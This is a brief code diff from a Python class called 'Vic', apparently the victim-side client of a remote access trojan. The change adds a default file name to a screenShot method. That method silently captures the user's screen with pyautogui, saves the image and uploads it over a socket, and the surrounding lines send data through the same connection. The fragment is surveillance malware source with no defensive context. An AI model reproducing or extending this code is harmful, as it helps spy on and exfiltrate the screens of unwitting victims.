@@ -78,6 +78,8 @@ class Vic():
             self.s.send(f)
 
     def screenShot(self,f_name):
+        if len(f_name) == 0:
+            f_name = "TMP_PiC.png"
         myScreenshot = pyautogui.screenshot()
         myScreenshot.save(f_name)
         self.upload_file(f_name)
